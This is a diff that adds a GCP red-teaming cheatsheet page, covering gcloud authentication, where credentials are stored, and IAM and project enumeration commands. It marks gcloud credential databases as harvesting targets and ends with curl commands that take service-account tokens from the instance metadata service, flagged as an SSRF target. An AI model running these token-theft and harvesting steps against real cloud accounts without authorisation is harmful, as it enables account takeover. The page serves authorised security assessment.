+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Cloud Pentest
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
               
               <article class="md-content__inner md-typeset">
                 
-  <h1>404 - Not found</h1>
+                  
+  
+  
 
+
+<h1 id="gcp-red-teaming-security-assessment-cheatsheet">GCP Red Teaming &amp; Security Assessment Cheatsheet<a class="headerlink" href="#gcp-red-teaming-security-assessment-cheatsheet" title="Permanent link">&para;</a></h1>
+<h2 id="google-cloud-ecosystem-overview">Google Cloud Ecosystem Overview<a class="headerlink" href="#google-cloud-ecosystem-overview" title="Permanent link">&para;</a></h2>
+<p><strong>Three Main Components of Google Cloud:</strong></p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Understanding these components helps identify attack surfaces across different Google services.</p>
+</div>
+<ul>
+<li><strong>Cloud Identity</strong> - Identity and Access Management (IDaaS)</li>
+<li><strong>Google Workspace</strong> (G-suite) - Productivity &amp; Collaboration Suite</li>
+<li><strong>Google Cloud Platform (GCP)</strong> - <em>IaaS, PaaS, SaaS</em> Cloud Services</li>
+</ul>
+<h3 id="cloud-identity-deep-dive">Cloud Identity Deep Dive<a class="headerlink" href="#cloud-identity-deep-dive" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Identity Provider (IdP)</strong><ul>
+<li>Cloud Identity is an Identity as a Service (IDaaS) solution</li>
+<li>Centrally manages users and groups across Google ecosystem</li>
+<li>Supports federation with external IdPs (Active Directory, Azure AD, etc.)</li>
+<li><strong>API Endpoint</strong>: <code>https://cloudidentity.googleapis.com</code></li>
+<li><strong>Key Role</strong>: Organization Admin (gcloud role)</li>
+</ul>
+</li>
+</ul>
+<h3 id="google-cloud-platform-fundamentals">Google Cloud Platform Fundamentals<a class="headerlink" href="#google-cloud-platform-fundamentals" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p><strong>Regions &amp; Zones</strong></p>
+<ul>
+<li><strong>Regions</strong>: Independent geographic areas composed of multiple zones</li>
+<li><strong>Zones</strong>: Isolated locations within regions (data centers)</li>
+<li><strong>Current Count</strong>: ~24 regions globally (check GCP documentation for updates)</li>
+<li><strong>Red Team Note</strong>: Resource location can impact legal/regulatory scope</li>
+</ul>
+</li>
+<li>
+<p><strong>Service Accounts</strong></p>
+<ul>
+<li>Special Google accounts representing non-human entities</li>
+<li>Used for authentication/authorization to Google APIs</li>
+<li><strong>Two Main Types</strong>:</li>
+<li><strong>User-managed service accounts</strong>: Created and managed by users</li>
+<li><strong>Default service accounts</strong>: Automatically created by GCP services</li>
+<li><strong>Security Consideration</strong>: Often over-privileged in misconfigured environments</li>
+</ul>
+</li>
+</ul>
+<h2 id="gcp-authentication-methods">GCP Authentication Methods<a class="headerlink" href="#gcp-authentication-methods" title="Permanent link">&para;</a></h2>
+<h3 id="authentication-credential-types">Authentication Credential Types<a class="headerlink" href="#authentication-credential-types" title="Permanent link">&para;</a></h3>
+<h4 id="long-term-credentials">Long-Term Credentials<a class="headerlink" href="#long-term-credentials" title="Permanent link">&para;</a></h4>
+<h5 id="graphical-user-interface-gui">Graphical User Interface (GUI)<a class="headerlink" href="#graphical-user-interface-gui" title="Permanent link">&para;</a></h5>
+<ul>
+<li>Gmail / G-Suite / Cloud Identity Username &amp; Password</li>
+<li>SSO Username &amp; Password (federated identity)</li>
+</ul>
+<h5 id="programmatic-interface-clisdk">Programmatic Interface (CLI/SDK)<a class="headerlink" href="#programmatic-interface-clisdk" title="Permanent link">&para;</a></h5>
+<ul>
+<li>Username &amp; Password (less common for services)</li>
+<li>Service Account JSON Key Files (primary service authentication)</li>
+<li>API Keys (for specific services)</li>
+</ul>
+<h4 id="short-term-credentials">Short-Term Credentials<a class="headerlink" href="#short-term-credentials" title="Permanent link">&para;</a></h4>
+<h5 id="programmatic-interface-clisdkapi">Programmatic Interface (CLI/SDK/API)<a class="headerlink" href="#programmatic-interface-clisdkapi" title="Permanent link">&para;</a></h5>
+<ul>
+<li>OAuth 2.0 Access Tokens (typically 1-hour validity)</li>
+<li>Identity Tokens (for service-to-service authentication)</li>
+</ul>
+<h3 id="gcloud-cli-authentication-operations">gcloud CLI Authentication Operations<a class="headerlink" href="#gcloud-cli-authentication-operations" title="Permanent link">&para;</a></h3>
+<p><strong>Interactive User Login:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>login
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># Opens browser for OAuth flow</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c1"># Stores credentials in local config</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>login<span class="w"> </span>--no-launch-browser
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># Use for CLI-only authentication</span>
+</span></code></pre></div>
+<p><strong>Service Account Authentication:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>activate-service-account<span class="w"> </span>--key-file<span class="w"> </span>service-account-key.json
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># Authenticates using service account credentials</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># Essential for automated scripts and service authentication</span>
+</span></code></pre></div>
+<p><strong>Credential Management:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># List authenticated accounts</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>list
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Set active account (when multiple are authenticated)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>gcloud<span class="w"> </span>config<span class="w"> </span><span class="nb">set</span><span class="w"> </span>account<span class="w"> </span><span class="o">[</span>EMAIL_OR_SERVICE_ACCOUNT<span class="o">]</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># Revoke credentials</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>revoke<span class="w"> </span><span class="o">[</span>ACCOUNT<span class="o">]</span>
+</span></code></pre></div>
+<h3 id="credential-storage-security">Credential Storage &amp; Security<a class="headerlink" href="#credential-storage-security" title="Permanent link">&para;</a></h3>
+<p>These locations are valuable targets for credential harvesting</p>
+<p><strong>gcloud CLI Credential Storage Locations:</strong></p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="credential-storage-security-windows" name="__tabbed_1" type="radio" /><input id="credential-storage-security-linuxmacos" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="credential-storage-security-windows">Windows</label><label for="credential-storage-security-linuxmacos">Linux/macOS</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="no">[UserName]</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">gcloud</span><span class="p">\</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>~/.config/gcloud/
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<h4 id="key-files-and-databases">Key files and databases<a class="headerlink" href="#key-files-and-databases" title="Permanent link">&para;</a></h4>
+<ul>
+<li><code>access_tokens.db</code> - Contains OAuth tokens</li>
+<li><code>credentials.db</code> - Contains service account keys</li>
+<li><code>legacy_credentials</code> - Old format credentials</li>
+<li><code>application_default_credentials.json</code> - ADC credentials</li>
+</ul>
+<p><strong>Credential Database Analysis:</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">-- access_tokens.db structure</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">Table</span><span class="p">:</span><span class="w"> </span><span class="n">access_tokens</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">Columns</span><span class="p">:</span><span class="w"> </span><span class="n">account_id</span><span class="p">,</span><span class="w"> </span><span class="n">access_token</span><span class="p">,</span><span class="w"> </span><span class="n">token_expiry</span><span class="p">,</span><span class="w"> </span><span class="n">rapt_token</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1">-- credentials.db structure  </span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="k">Table</span><span class="p">:</span><span class="w"> </span><span class="n">credentials</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">Columns</span><span class="p">:</span><span class="w"> </span><span class="n">account_id</span><span class="p">,</span><span class="w"> </span><span class="n">value</span>
+</span></code></pre></div>
+<p><strong>Tools for Credential Extraction:</strong></p>
+<ul>
+<li><strong>gcloud itself</strong>: Use <code>gcloud auth print-access-token</code></li>
+<li><strong>SQLite</strong>: Direct database querying</li>
+<li><strong>Custom scripts</strong>: Parse credential files programmatically</li>
+</ul>
+<h2 id="google-cloud-core-services-enumeration">Google Cloud Core Services Enumeration<a class="headerlink" href="#google-cloud-core-services-enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="initial-reconnaissance">Initial Reconnaissance<a class="headerlink" href="#initial-reconnaissance" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Current authentication context</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>list
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>gcloud<span class="w"> </span>config<span class="w"> </span>list
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>gcloud<span class="w"> </span>info<span class="w">  </span><span class="c1"># Detailed configuration information</span>
+</span></code></pre></div>
+<h3 id="organization-enumeration">Organization Enumeration<a class="headerlink" href="#organization-enumeration" title="Permanent link">&para;</a></h3>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Organization-level access provides visibility across all projects</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># List accessible organizations</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>gcloud<span class="w"> </span>organizations<span class="w"> </span>list
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Get organization details</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>gcloud<span class="w"> </span>organizations<span class="w"> </span>describe<span class="w"> </span><span class="o">[</span>ORGANIZATION_ID<span class="o">]</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># Enumerate IAM policies at organization level</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>gcloud<span class="w"> </span>organizations<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>ORGANIZATION_ID<span class="o">]</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="c1"># Format for easier reading</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>gcloud<span class="w"> </span>organizations<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>ORG_ID<span class="o">]</span><span class="w"> </span>--format<span class="o">=</span>json
+</span></code></pre></div>
+<h3 id="project-enumeration">Project Enumeration<a class="headerlink" href="#project-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># List all accessible projects</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>list
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>list<span class="w"> </span>--format<span class="o">=</span><span class="s2">&quot;table(projectId,name,projectNumber)&quot;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c1"># Get detailed project information</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>describe<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c1"># Enumerate project IAM policies</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span><span class="w"> </span>--format<span class="o">=</span>json
+</span></code></pre></div>
+<h3 id="service-account-enumeration">Service Account Enumeration<a class="headerlink" href="#service-account-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># List service accounts in project</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>service-accounts<span class="w"> </span>list
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>service-accounts<span class="w"> </span>list<span class="w"> </span>--format<span class="o">=</span><span class="s2">&quot;table(email,displayName)&quot;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Get IAM policy for specific service account</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>service-accounts<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>SERVICE_ACCOUNT_EMAIL<span class="o">]</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c1"># List keys for service account (requires iam.serviceAccountKeys.list permission)</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>service-accounts<span class="w"> </span>keys<span class="w"> </span>list<span class="w"> </span>--iam-account<span class="o">=[</span>SERVICE_ACCOUNT_EMAIL<span class="o">]</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="c1"># Describe service account key (metadata only)</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>service-accounts<span class="w"> </span>keys<span class="w"> </span>describe<span class="w"> </span><span class="o">[</span>KEY_ID<span class="o">]</span><span class="w"> </span>--iam-account<span class="o">=[</span>SERVICE_ACCOUNT_EMAIL<span class="o">]</span>
+</span></code></pre></div>
+<h3 id="role-permission-enumeration">Role &amp; Permission Enumeration<a class="headerlink" href="#role-permission-enumeration" title="Permanent link">&para;</a></h3>
+<p><strong>Pre-defined Roles:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># List available roles</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>list
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>list<span class="w"> </span>--filter<span class="o">=</span><span class="s2">&quot;title:Owner&quot;</span><span class="w">  </span><span class="c1"># Filter specific roles</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c1"># Get role details and permissions</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>describe<span class="w"> </span>roles/owner
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>describe<span class="w"> </span>roles/editor
+</span></code></pre></div>
+<p><strong>Custom Roles:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># List custom roles in project/organization</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>list<span class="w"> </span>--project<span class="o">=[</span>PROJECT_ID<span class="o">]</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>list<span class="w"> </span>--organization<span class="o">=[</span>ORG_ID<span class="o">]</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># Describe custom role</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>gcloud<span class="w"> </span>iam<span class="w"> </span>roles<span class="w"> </span>describe<span class="w"> </span><span class="o">[</span>ROLE_NAME<span class="o">]</span><span class="w"> </span>--project<span class="o">=[</span>PROJECT_ID<span class="o">]</span>
+</span></code></pre></div>
+<h3 id="advanced-enumeration-commands">Advanced Enumeration Commands<a class="headerlink" href="#advanced-enumeration-commands" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Check specific member permissions in project</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>--flatten<span class="o">=</span><span class="s2">&quot;bindings[].members&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">  </span>--filter<span class="o">=</span><span class="s2">&quot;bindings.members=serviceaccount:[SERVICE_ACCOUNT_EMAIL]&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">  </span>--format<span class="o">=</span><span class="s2">&quot;value(bindings.role)&quot;</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="c1"># Export IAM policy to file for analysis</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span><span class="w"> </span>--format<span class="o">=</span>json<span class="w"> </span>&gt;<span class="w"> </span>iam_policy.json
+</span></code></pre></div>
+<h2 id="red-team-operations-in-google-cloud">Red Team Operations in Google Cloud<a class="headerlink" href="#red-team-operations-in-google-cloud" title="Permanent link">&para;</a></h2>
+<h3 id="initial-compromise-enumeration">Initial Compromise &amp; Enumeration<a class="headerlink" href="#initial-compromise-enumeration" title="Permanent link">&para;</a></h3>
+<p><strong>Service Account Authentication:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>activate-service-account<span class="w"> </span>--key-file<span class="w"> </span>compromised-sa-key.json
+</span></code></pre></div>
+<p><strong>Basic Environment Recon:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># Project enumeration</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>list
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># Check current identity permissions</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>gcloud<span class="w"> </span>auth<span class="w"> </span>list
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>gcloud<span class="w"> </span>config<span class="w"> </span>list
+</span></code></pre></div>
+<p><strong>Targeted IAM Policy Query:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>gcloud<span class="w"> </span>projects<span class="w"> </span>get-iam-policy<span class="w"> </span><span class="o">[</span>PROJECT_ID<span class="o">]</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>--flatten<span class="o">=</span><span class="s2">&quot;bindings[].members&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span>--filter<span class="o">=</span><span class="s2">&quot;bindings.members=serviceaccount:[TARGET_SERVICE_ACCOUNT]&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">  </span>--format<span class="o">=</span><span class="s2">&quot;value(bindings.role)&quot;</span>
+</span></code></pre></div>
+<h3 id="compute-instance-exploitation">Compute Instance Exploitation<a class="headerlink" href="#compute-instance-exploitation" title="Permanent link">&para;</a></h3>
+<p><strong>List Compute Resources:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>gcloud<span class="w"> </span>compute<span class="w"> </span>instances<span class="w"> </span>list
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>gcloud<span class="w"> </span>compute<span class="w"> </span>instances<span class="w"> </span>describe<span class="w"> </span><span class="o">[</span>INSTANCE_NAME<span class="o">]</span><span class="w"> </span>--zone<span class="o">=[</span>ZONE<span class="o">]</span>
+</span></code></pre></div>
+<p><strong>Metadata Service Exploitation:</strong></p>
+<div class="admonition danger">
+<p class="admonition-title">Note</p>
+<p>Cloud Metadata API is a prime target via SSRF/RCE vulnerabilities</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Retrieve access token from metadata service</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Metadata-Flavor: Google&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="w">  </span><span class="s2">&quot;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&quot;</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="c1"># Get service account email</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Metadata-Flavor: Google&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="w">  </span><span class="s2">&quot;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email&quot;</span>
